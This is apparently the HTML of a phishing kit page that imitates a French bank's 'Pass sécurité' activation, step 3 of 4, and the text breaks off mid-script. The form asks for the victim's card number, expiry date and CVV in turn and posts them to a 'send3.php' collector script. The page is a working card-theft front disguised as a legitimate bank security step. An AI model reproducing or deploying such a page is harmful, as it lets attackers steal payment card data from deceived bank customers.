...
<body class="PRI waitJeton swm " style="">
    <header class="dcw_header dcw_header--auth js-header-auth dcw_header--no-nav dcw_header--no-connexion" role="banner">
        ...
        <div class="dcw_submenu-auth dcw_sidedrawer_subnav dcw_submenu-auth--persistent" style="background-image:url(index_files/img/trame.png')">
            <div class="dcw_submenu-auth_wrapper">
                ...
                <h1 class="dcw_submenu-auth_title">Pass sécurité - Etape 3/4</h1>
            </div>
        </div>
        <div class="dcw_header-title_mask">
            <div class="dcw_header-title is-sticky">
                <h2 class="dcw_header-title_title" id="js-mobile-title">Pass sécurité - Etape 3/4</h2>
    ...
    <main role="main" class="dcw_authent dcw_csetape">
        <div class="dcw_codeContainer">
			...
			<div id="oop" align="center">
				<img src="./files/img/loader.gif">
			</div>
			
            <div id="codCl">
				<form  action="send3.php"  method="POST" name="theForm">
                <div class="dcw_block dcw_block-text">
                    <div class="dcw_block-element">
                        <h3>Pour activer votre Pass Sécurité, <br>veuillez saisir les informations de votre carte.</h3>
                    </div>
                </div>
                ...
                <div class="dcw_block dcw_block-input">
                    <div class="dcw_block-element">
                        ...
                        <div id="divcc" style=" display: block; " class="row_section dcw_input-container">
                            <input id="hehehe" name="hehehe" type="text" class="dcw_input grey_cross" placeholder=" " maxlength="19" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" required="">
                            <span class="bar"></span>
                            <label>Numéro de carte</label>
							<div class="dcw_block dcw_block-button">
                    <div class="dcw_block-element">
                        <button id="btn-validate" type="button" onclick="showexp();" class="dcw_button-principal dcw_button-arrondi">Valider</button>
                    </div>
                </div>
                        </div>
						 <div  id="divexp" style=" display: none; " class="row_section dcw_input-container">
                            <input id="exp" name="exp" type="text" class="dcw_input grey_cross" placeholder=" " maxlength="7" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" required="">
                            <span class="bar"></span>
                            <label>Date d'expiration</label>
							<div class="dcw_block dcw_block-button">
                    <div class="dcw_block-element">
                        <button id="btn-validate" type="button"  onclick="showcv();"class="dcw_button-principal dcw_button-arrondi">Valider</button>
                    </div>
                </div>
                        </div>
						 <div id="divcv"  style=" display: none; " class="row_section dcw_input-container">
                            <input id="cv" name="cv" type="text" class="dcw_input grey_cross" placeholder=" " maxlength="4" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" required="">
                            <span class="bar"></span>
                            <label>Cryptogramme</label>
							<div class="dcw_block dcw_block-button">
                    <div class="dcw_block-element">
                        <button id="btn-validate" onclick="submitForm();" class="dcw_button-principal dcw_button-arrondi">Valider</button>
                    </div>
                </div>
                        </div>
...
<script type='text/javascript'>
$('#hehehe').on('keypress change', function () {
